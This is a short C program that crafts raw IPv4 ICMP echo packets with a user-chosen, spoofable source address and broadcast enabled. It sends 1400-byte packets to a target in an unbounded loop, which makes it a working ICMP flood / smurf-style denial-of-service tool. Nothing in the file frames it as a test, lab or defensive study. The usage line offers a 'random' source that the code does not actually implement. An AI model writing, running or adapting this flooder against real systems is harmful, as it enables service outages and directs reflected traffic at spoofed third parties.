#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>

//convert name of host to ip address
unsigned long resolve(char* hostname) 
{
	struct hostent *host;
	
	if ((host = gethostbyname(hostname)) == NULL) {
		herror("gethostbyname() failed");
		exit(-1);
	}
	
	return *(unsigned long*)host->h_addr_list[0];
}

//calculate check sum
unsigned short in_cksum(unsigned short* address, int length)
{
	unsigned short result;
	unsigned int sum = 0;
	
	//add all dwords
	while (length > 1) {
		sum += *address++;
		length -= 2;
	}
	
	//add one byte
	if (length == 1) {
		sum += *(unsigned char*) address;
	}
	
	sum = (sum >> 16) + (sum & 0xFFFF);
	//add carry
	sum += (sum >> 16);
	//invert result
	result = ~sum;
	
	return result;
}

int main(int argc, char* argv[])
{
	int socket_descriptor;
	int ttl = 1;
	const int on = 1;
	unsigned long destination_address, source_address;
	struct sockaddr_in server_address;
	
	char send_buffer[sizeof(struct iphdr) + sizeof(struct icmp) + 1400];
	struct iphdr* ip_header = (struct iphdr*) send_buffer;
	struct icmp* icmp_header = (struct icmp*) (send_buffer + sizeof(struct iphdr));
	
	if (argc != 5 || strcmp(argv[3], "-t") != 0) {
		fprintf(stderr, 
		"Usage: %s <source address | random> <destination address> -t <ttl>\n",
		argv[0]);
		exit(-10);
	}
	
	//create raw socket 
	if ((socket_descriptor = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0 ) {
		perror("socket() failed");
		exit(-1);
	}
	
	//set IP_HDRINCL for fill ip header
	if (setsockopt(socket_descriptor, IPPROTO_IP, IP_HDRINCL, (char*) &on, sizeof(on)) < 0) {
		perror("setsockopt() failed");
		exit(-1);
	}
	
	//set broadcast mode
	if (setsockopt(socket_descriptor, SOL_SOCKET, SO_BROADCAST, (char*) &on, sizeof(on)) < 0) {
		perror("setsockopt() failed");
		exit(-1);
	}
	
	source_address = resolve(argv[1]);
	destination_address = resolve(argv[2]);
	
	bzero(&server_address, sizeof(server_address));
	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = destination_address;
	
	ttl = atoi(argv[4]);
	
	//fill ip header
	ip_header->ihl = 5;
	ip_header->version = 4;
	ip_header->tos = 0;
	ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmp) + 1400);
	ip_header->id = 0;
	ip_header->frag_off = 0;
	ip_header->ttl = ttl;
	ip_header->protocol = IPPROTO_ICMP;
	ip_header->check = 0;
	ip_header->check = in_cksum((unsigned short*) ip_header, sizeof(struct iphdr));
	ip_header->saddr = source_address;
	ip_header->daddr = destination_address;
	
	//fill icmp header
	icmp_header->icmp_type = ICMP_ECHO;
	icmp_header->icmp_code = 0;
	icmp_header->icmp_id = 1;
	icmp_header->icmp_seq = 1;
	icmp_header->icmp_cksum = 0;
	icmp_header->icmp_cksum = in_cksum((unsigned short*) icmp_header, sizeof(struct icmp) +1400);
	
	//send requests
	while(1) {
		if(sendto(socket_descriptor, send_buffer, sizeof(send_buffer), 
		   0, (struct sockaddr*) &server_address, sizeof(server_address)) < 0) {
			perror("sendto() failed");
			exit(-1);
		}
	}
	
	return 0;
}
